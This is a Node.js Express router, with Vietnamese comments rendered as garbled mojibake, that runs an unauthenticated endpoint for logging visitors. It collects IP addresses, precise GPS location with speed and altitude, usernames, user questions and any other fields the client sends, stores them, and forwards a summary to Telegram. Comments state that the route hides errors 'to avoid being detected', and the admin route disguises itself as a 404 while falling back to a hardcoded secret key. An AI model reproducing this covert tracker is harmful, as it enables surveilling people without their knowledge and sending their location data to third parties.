const express = require('express');
const router = express.Router();
const IPLog = require('../models/IPLog');
const sendIPNotification = require('../utils/sendTelegram');

// Cache ƒë·ªÉ l∆∞u tr·ªØ th·ªùi gian truy c·∫≠p g·∫ßn nh·∫•t c·ªßa m·ªói IP
const ipLogCache = {};
// Th·ªùi gian t·ªëi thi·ªÉu gi·ªØa 2 l·∫ßn ghi nh·∫≠n log (60 gi√¢y)
const MIN_LOG_INTERVAL = 60000;

// L∆∞u tr·ªØ c√°c request ID ƒë√£ ƒë∆∞·ª£c x·ª≠ l√Ω
const processedRequestIds = new Set();
// K√≠ch th∆∞·ªõc t·ªëi ƒëa c·ªßa Set l∆∞u tr·ªØ request IDs
const MAX_REQUEST_IDS = 1000;

// Route ·∫©n danh ƒë·ªÉ ghi nh·∫≠n IP - kh√¥ng c·∫ßn x√°c th·ª±c
router.post('/log-ip', async (req, res) => {
    try {
        // L·∫•y IP t·ª´ c√°c header kh√°c nhau, ∆∞u ti√™n t·ª´ proxy headers
        const ip = req.headers['x-forwarded-for'] ||
            req.headers['x-real-ip'] ||
            req.headers['cf-connecting-ip'] ||
            req.headers['true-client-ip'] ||
            req.connection.remoteAddress ||
            req.socket.remoteAddress ||
            (req.connection.socket ? req.connection.socket.remoteAddress : 'unknown');

        // Ki·ªÉm tra request ID ƒë·ªÉ tr√°nh x·ª≠ l√Ω c√°c request tr√πng l·∫∑p
        const requestId = req.body.requestId || `${ip}-${Date.now()}-${Math.random().toString(36).substring(2, 10)}`;
        if (processedRequestIds.has(requestId)) {
            console.log(`Request ƒë√£ ƒë∆∞·ª£c x·ª≠ l√Ω: ${requestId}`);
            return res.status(204).end();
        }

        // Th√™m request ID v√†o danh s√°ch ƒë√£ x·ª≠ l√Ω
        processedRequestIds.add(requestId);

        // Gi·ªõi h·∫°n k√≠ch th∆∞·ªõc c·ªßa Set ƒë·ªÉ tr√°nh r√≤ r·ªâ b·ªô nh·ªõ
        if (processedRequestIds.size > MAX_REQUEST_IDS) {
            // X√≥a ph·∫ßn t·ª≠ ƒë·∫ßu ti√™n
            const iterator = processedRequestIds.values();
            const firstItem = iterator.next().value;
            processedRequestIds.delete(firstItem);
        }

        // Ki·ªÉm tra th·ªùi gian truy c·∫≠p g·∫ßn nh·∫•t
        const currentTime = Date.now();
        const lastLogTime = ipLogCache[ip] || 0;
        if (currentTime - lastLogTime < MIN_LOG_INTERVAL) {
            // ƒê√£ ghi nh·∫≠n g·∫ßn ƒë√¢y, tr·∫£ v·ªÅ ngay l·∫≠p t·ª©c
            console.log(`B·ªè qua log cho IP ${ip} (ƒë√£ ghi nh·∫≠n g·∫ßn ƒë√¢y)`);
            return res.status(204).end();
        }

        // C·∫≠p nh·∫≠t th·ªùi gian truy c·∫≠p g·∫ßn nh·∫•t
        ipLogCache[ip] = currentTime;

        // L·∫•y th√¥ng tin tr√¨nh duy·ªát
        const userAgent = req.headers['user-agent'] || '';

        // L·∫•y ƒë∆∞·ªùng d·∫´n truy c·∫≠p
        const path = req.body.path || '/';

        // L·∫•y th√¥ng tin Referer t·ª´ header v√† body
        const referrer = req.body.referrer || req.headers['referer'] || '';

        // L·∫•y th·ªùi gian hi·ªán t·∫°i
        let time;
        let clientTimeFormatted = '';

        // ∆Øu ti√™n s·ª≠ d·ª•ng th·ªùi gian ƒë·ªãa ph∆∞∆°ng c·ªßa client n·∫øu c√≥
        if (req.body.localTime) {
            clientTimeFormatted = req.body.localTime;
        }

        // N·∫øu client g·ª≠i timestamp, d√πng timestamp ƒë√≥ ƒë·ªÉ c√≥ th·ªùi gian ch√≠nh x√°c c·ªßa client
        if (req.body.timestamp) {
            try {
                time = new Date(req.body.timestamp);
                // Ki·ªÉm tra n·∫øu th·ªùi gian kh√¥ng h·ª£p l·ªá th√¨ d√πng th·ªùi gian m√°y ch·ªß
                if (isNaN(time.getTime())) {
                    time = new Date();
                }
            } catch {
                time = new Date();
            }
        } else {
            time = new Date();
        }

        // Th√™m th√¥ng tin request ID v√†o d·ªØ li·ªáu ƒë∆∞·ª£c l∆∞u
        const requestInfo = {
            requestId: requestId,
            processedAt: currentTime
        };

        // T·∫°o b·∫£n ghi log v·ªõi th√¥ng tin m·ªü r·ªông t·ª´ client
        const ipLog = new IPLog({
            ip,
            userAgent,
            time,
            path,
            referrer,
            language: req.body.language || '',
            screenSize: {
                width: req.body.screenWidth || 0,
                height: req.body.screenHeight || 0
            },
            timeZone: req.body.timeZone || '',
            location: {
                latitude: req.body.latitude || req.body.ipBasedLatitude || null,
                longitude: req.body.longitude || req.body.ipBasedLongitude || null,
                accuracy: req.body.accuracy || null,
                altitude: req.body.altitude || null,
                altitudeAccuracy: req.body.altitudeAccuracy || null,
                heading: req.body.heading || null,
                speed: req.body.speed || null,
                address: req.body.address || null,
                addressDetails: req.body.addressDetails || null
            },
            // L∆∞u c√°c th√¥ng tin kh√°c v√†o clientInfo
            clientInfo: {
                timestamp: req.body.timestamp,
                localTime: req.body.localTime,
                timezoneOffset: req.body.timezoneOffset,
                positionTimestamp: req.body.positionTimestamp,
                requestInfo: requestInfo,
                ...req.body // L∆∞u t·∫•t c·∫£ d·ªØ li·ªáu kh√°c t·ª´ client
            }
        });

        // L∆∞u v√†o c∆° s·ªü d·ªØ li·ªáu (kh√¥ng ƒë·ª£i k·∫øt qu·∫£ ƒë·ªÉ tr·∫£ v·ªÅ nhanh)
        ipLog.save().catch(() => { });

        // Chu·∫©n b·ªã th√¥ng tin n√¢ng cao ƒë·ªÉ g·ª≠i th√¥ng b√°o
        const extraInfo = [];
        if (req.body.referrer) extraInfo.push(`üì§ Ngu·ªìn: ${req.body.referrer}`);
        if (req.body.language) extraInfo.push(`üåê Ng√¥n ng·ªØ: ${req.body.language}`);
        if (req.body.timeZone) extraInfo.push(`üïí M√∫i gi·ªù: ${req.body.timeZone}`);

        // Th√™m th√¥ng tin ƒë·ªãa l√Ω ∆∞·ªõc t√≠nh t·ª´ m√∫i gi·ªù n·∫øu c√≥
        if (req.body.estimatedContinent && req.body.estimatedCity) {
            extraInfo.push(`üåé V√πng ∆∞·ªõc t√≠nh: ${req.body.estimatedContinent}, ${req.body.estimatedCity}`);
        }

        // Th√™m th√¥ng tin ƒë·ªãa l√Ω ∆∞·ªõc t√≠nh t·ª´ ng√¥n ng·ªØ
        if (req.body.estimatedCountry) {
            extraInfo.push(`üèÅ Qu·ªëc gia ∆∞·ªõc t√≠nh: ${req.body.estimatedCountry}`);
        }

        // Th√™m th·ªùi gian ƒë·ªãa ph∆∞∆°ng c·ªßa client n·∫øu c√≥
        if (clientTimeFormatted) {
            extraInfo.push(`‚è±Ô∏è Th·ªùi gian ƒë·ªãa ph∆∞∆°ng: ${clientTimeFormatted}`);
        }

        // X·ª≠ l√Ω th√¥ng tin v·ªã tr√≠ t·ª´ IP (kh√¥ng c·∫ßn quy·ªÅn)
        if (req.body.ipBasedLatitude && req.body.ipBasedLongitude) {
            const lat = parseFloat(req.body.ipBasedLatitude);
            const lng = parseFloat(req.body.ipBasedLongitude);

            // Ki·ªÉm tra t·ªça ƒë·ªô c√≥ h·ª£p l·ªá kh√¥ng
            if (!isNaN(lat) && !isNaN(lng) &&
                lat >= -90 && lat <= 90 &&
                lng >= -180 && lng <= 180) {

                // L√†m tr√≤n t·ªça ƒë·ªô ƒë·ªÉ b·∫£o v·ªá quy·ªÅn ri√™ng t∆∞
                const roundedLat = parseFloat(lat.toFixed(4));
                const roundedLng = parseFloat(lng.toFixed(4));

                extraInfo.push(`üìå V·ªã tr√≠ t·ª´ IP (${req.body.ipBasedSource || 'kh√¥ng r√µ ngu·ªìn'}): ${roundedLat}, ${roundedLng}`);

                // Th√™m th√¥ng tin chi ti·∫øt v·ªÅ v·ªã tr√≠ n·∫øu c√≥
                if (req.body.ipBasedCity && req.body.ipBasedCountry) {
                    extraInfo.push(`üèôÔ∏è ƒê·ªãa ƒëi·ªÉm IP: ${req.body.ipBasedCity}, ${req.body.ipBasedCountry}`);
                }

                if (req.body.ipBasedOrg) {
                    extraInfo.push(`üåê T·ªï ch·ª©c: ${req.body.ipBasedOrg}`);
                }
            }
        }

        // X·ª≠ l√Ω t·ªça ƒë·ªô t·ª´ client (c√≥ ƒë·ªô ch√≠nh x√°c cao h∆°n IP lookup)
        if (req.body.latitude && req.body.longitude) {
            const lat = parseFloat(req.body.latitude);
            const lng = parseFloat(req.body.longitude);

            // Ki·ªÉm tra t·ªça ƒë·ªô c√≥ h·ª£p l·ªá kh√¥ng
            if (!isNaN(lat) && !isNaN(lng) &&
                lat >= -90 && lat <= 90 &&
                lng >= -180 && lng <= 180) {

                // L√†m tr√≤n t·ªça ƒë·ªô ƒë·∫øn 6 ch·ªØ s·ªë th·∫≠p ph√¢n ƒë·ªÉ tr√°nh qu√° ch√≠nh x√°c v√† b·∫£o v·ªá quy·ªÅn ri√™ng t∆∞
                const roundedLat = parseFloat(lat.toFixed(6));
                const roundedLng = parseFloat(lng.toFixed(6));

                const source = req.body.locationSource || 'kh√¥ng r√µ';
                extraInfo.push(`üìç T·ªça ƒë·ªô (${source}): ${roundedLat}, ${roundedLng}`);

                // Th√™m th√¥ng tin ƒë·ªô ch√≠nh x√°c n·∫øu c√≥
                if (req.body.accuracy) {
                    const accuracyMeters = parseFloat(req.body.accuracy).toFixed(0);
                    extraInfo.push(`üéØ ƒê·ªô ch√≠nh x√°c: ${accuracyMeters} m√©t`);
                }
            }
        }

        // Th√™m th√¥ng tin ng∆∞·ªùi d√πng n·∫øu c√≥
        if (req.body.userName) {
            extraInfo.push(`userName: ${req.body.userName}`);
        }

        // Th√™m c√¢u h·ªèi ng∆∞·ªùi d√πng n·∫øu c√≥ 
        if (req.body.userQuestion) {
            extraInfo.push(`userQuestion: ${req.body.userQuestion}`);
        }

        // G·ª≠i th√¥ng b√°o qua Telegram (kh√¥ng ƒë·ª£i ƒë·ªÉ tr√°nh l√†m ch·∫≠m response)
        sendIPNotification(ip, time, userAgent, path, extraInfo.join('\n'))
            .catch(() => { /* B·ªè qua l·ªói */ });

        // D·ªçn d·∫πp ipLogCache ƒë·ªãnh k·ª≥ ƒë·ªÉ tr√°nh r√≤ r·ªâ b·ªô nh·ªõ
        cleanupIpLogCache();

        // Tr·∫£ v·ªÅ th√†nh c√¥ng m√† kh√¥ng ƒë·ª£i c√°c t√°c v·ª• ho√†n th√†nh
        res.status(204).end();
    } catch (error) {
        // Tr·∫£ v·ªÅ th√†nh c√¥ng ngay c·∫£ khi c√≥ l·ªói ƒë·ªÉ tr√°nh b·ªã ph√°t hi·ªán
        res.status(204).end();
    }
});

/**
 * D·ªçn d·∫πp b·ªô nh·ªõ ƒë·ªám ipLogCache ƒë·ªÉ tr√°nh r√≤ r·ªâ b·ªô nh·ªõ
 */
function cleanupIpLogCache() {
    const currentTime = Date.now();
    const SIX_HOURS = 6 * 3600000; // 6 gi·ªù

    // Ch·ªâ gi·ªØ l·∫°i c√°c m·ª•c c√≥ th·ªùi gian g·∫ßn ƒë√¢y (trong v√≤ng 6 gi·ªù)
    for (const ip in ipLogCache) {
        if (currentTime - ipLogCache[ip] > SIX_HOURS) {
            delete ipLogCache[ip];
        }
    }
}

// Route b·∫£o m·∫≠t ƒë·ªÉ l·∫•y danh s√°ch IP - y√™u c·∫ßu m·∫≠t kh·∫©u
router.get('/ip-logs', async (req, res) => {
    try {
        // Ki·ªÉm tra access token ƒë∆°n gi·∫£n
        const authHeader = req.headers.authorization;
        const secretToken = process.env.ADMIN_SECRET || 'secret-admin-key';

        if (!authHeader || authHeader !== `Bearer ${secretToken}`) {
            // Kh√¥ng hi·ªÉn th·ªã l·ªói 401/403 ƒë·ªÉ tr√°nh k·∫ª t·∫•n c√¥ng ph√°t hi·ªán API n√†y t·ªìn t·∫°i
            return res.status(404).json({ message: 'Not found' });
        }

        // L·∫•y c√°c b·∫£n ghi IP t·ª´ m·ªõi nh·∫•t ƒë·∫øn c≈© nh·∫•t
        const logs = await IPLog.find().sort({ time: -1 }).limit(100);
        res.status(200).json(logs);
    } catch (error) {
        res.status(404).json({ message: 'Not found' });
    }
});

module.exports = router; 